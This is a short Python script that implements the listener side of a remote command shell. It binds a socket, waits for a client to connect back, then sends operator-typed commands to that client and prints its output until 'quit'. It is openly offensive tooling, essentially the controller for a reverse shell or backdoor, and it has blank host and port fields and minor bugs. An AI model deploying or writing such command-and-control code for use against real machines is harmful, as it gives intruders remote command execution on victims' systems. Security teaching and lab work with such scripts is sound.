import os 
import socket
import subprocess
import sys

# create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = "" #set host ip here
        port ="" # set host port here
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))

# bind socket to host 
def socket_bind():
    try:
        global host
        global port
        global s
        print("binding socket to port: " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error: " + str(msg) + "\n" + "retrying...")
        socket_bind()
    
# estabilish connection with client
def socket_accept():
    conn, address = s.accept()
    print("connection has been estabilished | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

#send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

# main function 
def main():
    create_socket()
    socket_bind()
    socket_accept()

# call mnain
main()